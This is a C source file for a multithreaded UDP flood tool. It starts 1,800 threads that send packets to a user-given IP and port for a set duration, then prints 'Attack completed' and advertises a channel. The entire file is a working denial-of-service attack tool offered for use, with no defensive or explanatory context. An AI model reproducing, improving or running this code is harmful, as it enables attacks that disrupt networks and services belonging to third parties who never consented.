#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>

#define THREAD_COUNT 1800
#define PACKET_SIZE 20

volatile int running = 1;
char* target_ip;
int target_port;

void* send_packets(void* arg) {
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];
    memset(packet, 'A', PACKET_SIZE);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);

    while (running) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION_SEC>\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    pthread_t threads[THREAD_COUNT];
    time_t start_time = time(NULL);

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_packets, NULL);
    }

    while (time(NULL) - start_time < duration) {
        sleep(1);
    }

    running = 0;

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAttack completed. Join channel @PRIMExBUGGI\n");
    return 0;
}